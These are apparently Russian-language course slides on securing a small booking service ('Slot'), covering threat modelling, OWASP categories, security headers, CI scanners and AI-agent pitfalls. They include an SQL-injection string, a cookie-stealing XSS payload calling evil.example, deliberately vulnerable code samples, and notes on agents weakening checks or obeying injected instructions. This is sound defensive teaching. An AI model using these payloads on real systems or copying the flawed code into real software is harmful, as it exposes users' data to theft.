## Почему уже сейчас

- Новый сервер начинают сканировать боты **через минуты** после появления в интернете
- Атакуют не вас лично, а **всех подряд**: открытый порт БД, `/.env`, `/admin`, старый WordPress
- У «Slot» есть что украсть: **телефоны клиентов** (персональные данные), аккаунт мастера, возможность сорвать запись
- Утечка — это штрафы, потеря доверия и часы на разбор

> Безопасность — не функция, которую добавляют в конце, а процесс: модель угроз → защиты → проверки → мониторинг.

## Модель угроз

Три вопроса: **что защищаем**, **где вход**, **кто атакует**.

| Актив «Slot» | Точка входа | Атакующий |
|---|---|---|
| Телефоны и имена клиентов | API записей, админка | Сборщик баз, любопытный клиент |
| Аккаунт мастера | Форма входа, сброс пароля | Перебор паролей, фишинг |
| Расписание и записи | API бронирования | Конкурент, бот, «шутник» |
| Сервер и БД | SSH, порты, зависимости | Автоматические сканеры |

**STRIDE** как чек-лист: подмена личности, изменение данных, отказ от действий, утечка, отказ в обслуживании, повышение прав.

## A01: контроль доступа и IDOR

```python
# Плохо: любой залогиненный видит любую запись, перебирая id
@app.get("/api/bookings/{booking_id}")
async def get_booking(booking_id: int):
    return await repo.get_booking(booking_id)

# Хорошо: проверяем, что запись принадлежит пользователю
@app.get("/api/bookings/{booking_id}")
async def get_booking(booking_id: int, user: User = Depends(current_user)):
    booking = await repo.get_booking(booking_id)
    if booking is None or not user.can_view(booking):
        raise HTTPException(404)    # не 403: не подтверждаем, что запись существует
    return booking
```

Самая частая уязвимость: «залогинен» ≠ «имеет право на этот объект». Проверка — на **каждом** эндпоинте, на сервере.

## A05: SQL-инъекция

```python
# Плохо: ввод пользователя становится частью SQL
await db.fetch(f"SELECT * FROM bookings WHERE client_phone = '{phone}'")
# phone = "' OR '1'='1"  →  все записи всех клиентов

# Хорошо: параметризованный запрос — ввод передаётся отдельно от SQL
await db.fetch("SELECT * FROM bookings WHERE client_phone = $1", phone)
```

- ORM и query builder параметризуют сами — опасны «сырые» строки и `f"..."` в SQL
- То же для командной строки: никогда `os.system(f"convert {filename}")` с вводом пользователя

## A05: XSS — чужой скрипт на вашей странице

Клиент оставляет отзыв: `<img src=x onerror="fetch('https://evil.example/?c='+document.cookie)">`

- React и Vue **экранируют** вывод по умолчанию — опасны `dangerouslySetInnerHTML`, `v-html` и вывод Markdown в HTML без очистки
- Ответ LLM (Модуль 7) — тоже недоверенный ввод
- Очистка HTML — DOMPurify; на сервере — проверка и ограничение формата
- **Content Security Policy** — второй рубеж: браузер не выполнит скрипт с чужого домена

## CSRF, cookie и CORS

- **CSRF:** чужой сайт отправляет запрос к вашему API, а браузер прикладывает cookie пользователя
- Защита: cookie с `SameSite=Lax` или `Strict` + CSRF-токен для форм; изменения — только `POST`/`PATCH`/`DELETE`, никогда `GET`
- Cookie сессии: `HttpOnly` (недоступна JavaScript), `Secure` (только HTTPS)
- **CORS** разрешает браузеру читать ответы вашего API с других доменов. Разрешайте только свои домены; `*` вместе с cookie — ошибка конфигурации
- CORS **не защищает сервер**: `curl` его игнорирует. Права всё равно проверяет API

## A07: аутентификация

| Что | Как правильно |
|---|---|
| Хранение паролей | **argon2id** (или bcrypt), никогда MD5/SHA без соли |
| Перебор | Лимит попыток на аккаунт и IP, растущая задержка |
| Администраторы | **MFA** обязательно |
| Сессии и токены | Короткий срок жизни, выход аннулирует сессию |
| Сброс пароля | Одноразовый токен на 15–30 минут; не сообщать, существует ли email |
| Можно не хранить пароли вовсе | Вход через Telegram, Яндекс ID, Google (OAuth/OIDC) или код по SMS |

## A02: ошибки конфигурации

- `DEBUG=True` в продакшене → стектрейсы и настройки видны всем
- Пароли по умолчанию: `postgres/postgres`, `admin/admin`
- PostgreSQL, Redis, панель Docker открыты в интернет — только приватная сеть (Модуль 11)
- Открытый `/.env`, `/.git` в корне сайта
- Подробные ошибки: «пользователь не найден» vs «неверный пароль» — подсказка для перебора
- Лишние сервисы и порты — каждый открытый порт это точка входа

Проверка: `nmap` своего сервера снаружи — открыты должны быть только 22, 80, 443.

## Заголовки безопасности

```
slot.example {
    header {
        Strict-Transport-Security "max-age=31536000; includeSubDomains"
        Content-Security-Policy "default-src 'self'; img-src 'self' data:; frame-ancestors 'none'"
        X-Content-Type-Options "nosniff"
        Referrer-Policy "strict-origin-when-cross-origin"
        -Server
    }
    reverse_proxy web:3000
}
```

| Заголовок | Защищает от |
|---|---|
| HSTS | Подмены HTTPS на HTTP |
| CSP | XSS, загрузки чужих скриптов; `frame-ancestors` — встраивания во фрейм (clickjacking) |
| `nosniff` | Выполнения файла не того типа |
| `Referrer-Policy` | Утечки адресов страниц на чужие сайты |

## A06: злоупотребление бизнес-логикой

Бот за минуту записывается на **все** слоты пятницы на вымышленные номера. Ни одной «уязвимости» — всё по API.

- Лимит **активных записей на телефон** (например, 2)
- Подтверждение записи кодом в Telegram или SMS
- Лимиты на IP и устройство; капча — только при аномалиях
- Автоотмена неподтверждённых записей через 15 минут
- Алерт мастеру при всплеске записей

Такие угрозы находит модель угроз, а не сканер.

## A03: цепочка поставок

- 90% кода вашего приложения — **чужие пакеты**
- **Lock-файлы** и фиксированные версии; хэши пакетов (`uv lock`, `pip --require-hashes`, `package-lock.json`)
- **pip-audit**, **npm audit**, Dependabot или Renovate — известные уязвимости и автоматические PR с обновлениями
- **Trivy** — уязвимости в образах; **SBOM** (Syft) — список всего, что внутри
- **Slopsquatting:** ИИ-агент советует пакет, которого не существует, — злоумышленник регистрирует это имя. Перед установкой проверяйте, что пакет реальный и популярный

## Персональные данные

- **Минимизация:** не собирайте то, что не нужно; для записи хватит имени и телефона
- **Шифрование:** при передаче — TLS; при хранении — шифрование диска или БД; бэкапы — тоже
- **Маскирование в логах:** `+7******4567`, никаких токенов и паролей
- **Сроки хранения:** удалять или обезличивать старые записи
- **Доступ:** кто из сотрудников видит данные — и журнал этого доступа
- Требования закона (152-ФЗ, GDPR) — Модуль 12

## Логи, алерты и ошибки

- Логируйте события безопасности: входы и неудачи, отказы в доступе, действия администраторов, смену настроек
- Алерты: всплеск `401`/`403`, много неудачных входов, резкий рост записей
- Клиенту — **общее сообщение** и `request_id`; подробности — только в логах
- **Fail closed:** если проверка прав упала с ошибкой — доступ запрещён, а не разрешён

```json
{"type": "https://slot.example/errors/internal", "title": "Что-то пошло не так",
 "status": 500, "request_id": "7f3a9c"}
```

## Безопасность в CI

| Проверка | Инструмент | Что находит |
|---|---|---|
| Секреты в коде | **gitleaks** | Ключи и пароли в коммитах |
| SAST | **Semgrep**, Bandit | Опасные паттерны в коде: SQL из строк, `eval` |
| Зависимости | **pip-audit**, npm audit | Известные уязвимости в пакетах |
| Образы | **Trivy** | Уязвимости в базовом образе и пакетах ОС |
| DAST | **OWASP ZAP** baseline | Проблемы работающего приложения на staging |

Проверка падает → PR не сливается. Ложные срабатывания — разбирать и помечать, а не отключать проверку целиком.

<!-- Slide 19 -->
## Безопасность и ИИ-агенты

- Код агента проходит **такое же ревью**, как код стажёра — а то и строже
- Агенты склонны «чинить» падающую проверку, **отключая** её или ослабляя правило
- Агент может записать секрет в лог, в тест или в коммит — gitleaks ловит это в CI
- Инструкции в issue, README или зависимостях — **данные**, а не команды для агента
- Агент **хорошо ищет** уязвимости по чек-листу, но даёт ложные срабатывания — каждую находку проверяйте

## Лабораторная работа

1. Модель угроз «Slot» на одну страницу
2. **Только на своём staging**, в паре: IDOR между двумя тестовыми пользователями, SQL-инъекция, XSS через отзыв, перебор пароля, массовая запись скриптом
3. Базовое сканирование **OWASP ZAP**
4. Исправьте находки; добавьте заголовки безопасности и лимиты
5. В CI: gitleaks, Semgrep, pip-audit/npm audit, Trivy
6. **С агентом:** проверка кода по чек-листу OWASP и тесты, воспроизводящие каждую уязвимость до исправления; каждую находку проверьте сами
